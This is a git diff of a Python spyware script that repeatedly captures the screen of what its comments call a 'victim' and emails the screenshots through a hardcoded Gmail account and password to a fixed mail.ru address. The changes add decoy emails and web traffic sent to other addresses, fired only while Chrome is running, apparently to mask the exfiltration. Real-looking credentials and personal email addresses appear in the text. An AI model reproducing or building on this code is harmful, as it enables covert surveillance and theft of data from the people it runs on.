@@ -18,14 +18,15 @@ import requests
 from threading import Thread
 
 
-time_interval_screen = random.randint(5, 15)
-time_interval_noise_mail =  random.randint(2,10)
-time_web_noise = random.randint(10, 15)
+time_interval_screen = 20
+time_interval_noise_mail =  30 # random.randint(2,10)
+time_web_noise = random.randint(40, 80)
 smpt_server = 'smtp.gmail.com'
 smtp_port = 465
 smtp_acct = 'becyp2137@gmail.com'
 smtp_password = 'SlavaUkrainie69'
-tgt_accts = ['becyp2137@gmail.com', 'becyp69@op.pl', 'becyp2137@gmail.com', "iravacik@yandex.com", "putin_klug@mail.ru" , "tamara.pol222@mail.ru", "cathuvar9090@mail.ru", "wanila0001@yandex.com" ]
+tgt_accts = "putin_klug@mail.ru" 
+tgt_noise = ['becyp69@op.pl', "iravacik@yandex.com", "tamara.pol222@mail.ru", "cathuvar9090@mail.ru", "wanila0001@yandex.com" ]
 now = datetime.now() # current date and time
 
 # getting the size of screen, a victim can have multiple monito
@@ -67,7 +68,7 @@ def screenshot_email(subject):
     msg = EmailMessage()
     msg['Subject'] = subject
     msg['From'] = smtp_acct
-    address = tgt_accts[random.randint(0,7)]
+    address = tgt_accts
     print(address)
     msg['To'] = address # This might be change for biggger address
     msg.set_content(subject)
@@ -78,8 +79,8 @@ def screenshot_email(subject):
         file_data = f.read()
         file_type = imghdr.what(f.name)
         file_name = f.name
-    if os.path.isfile('screenshot.bmp'):
-        os.remove('screenshot.bmp')
+    # if os.path.isfile('screenshot.bmp'):
+    #    os.remove('screenshot.bmp')
 
     msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
     mailobj.send_message(msg)
@@ -106,13 +107,13 @@ def noise():
         print(ex)
     
 
-def plain_email(subject):
+def plain_email():
     mailobj = smtplib.SMTP('smtp.gmail.com',587)
     mailobj.ehlo()
     mailobj.starttls()
     mailobj.login('becyp2137@gmail.com','SlavaUkrainie69')
-    msg = f"Subject: {subject} \n\n {subject}"
-    address = tgt_accts[random.randint(0,7)]
+    msg = f"Subject: Wersja Super Ez \n\n U r n00b when you read it"
+    address = tgt_noise[random.randint(0,len(tgt_noise) -1 )]
     print(address)
     mailobj.sendmail(smtp_acct, address , msg)
     print("plain mail send")
@@ -138,10 +139,10 @@ class Plainmain(Thread):
         self.daemon = True
         self.start()
     def run(self):
+        
         while True:
-            now = datetime.now() # current date and time
-            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-            plain_email(date_time)
+            if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
+                plain_email()
             sleep(time_interval_noise_mail)
 
 
@@ -152,7 +153,8 @@ class Noise(Thread):
         self.start()
     def run(self):
         while True:
-            noise()
+            if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
+                noise()
             sleep(time_web_noise)
 
 
